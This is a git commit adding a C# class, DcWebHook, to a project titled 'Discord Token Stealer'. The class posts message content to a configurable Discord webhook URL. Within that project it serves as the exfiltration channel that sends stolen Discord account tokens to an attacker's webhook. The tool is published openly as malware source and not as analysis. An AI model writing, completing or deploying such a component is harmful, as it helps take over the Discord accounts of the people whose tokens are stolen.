3bc9da49bdadad064de78ceb87d2aa5fe8f27b10
icorex <38869243+notkohlrexo@users.noreply.github.com>
2019-06-25 23:45:43 +0200

    Published

---
+++ Discord Token Stealer/Discord Token Stealer/dcWebHook.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Collections.Specialized;
+using System.Net;
+
+public class DcWebHook: IDisposable
+    {
+        private readonly WebClient dWebClient;
+        private static NameValueCollection discordValues = new NameValueCollection();
+        public string WebHook { get; set;}
+        public string UserName { get; set; }
+        public string ProfilePicture { get; set;}
+
+        public DcWebHook()
+        {
+            dWebClient = new WebClient();
+        }
+      
+
+        public void SendMessage(string msgSend)
+        {
+            discordValues.Add("username", UserName);
+            discordValues.Add("avatar_url", ProfilePicture);
+            discordValues.Add("content", msgSend);
+
+            dWebClient.UploadValues(WebHook, discordValues);
+        }
+
+        public void Dispose()
+        {
+            dWebClient.Dispose();
+        }
+    }
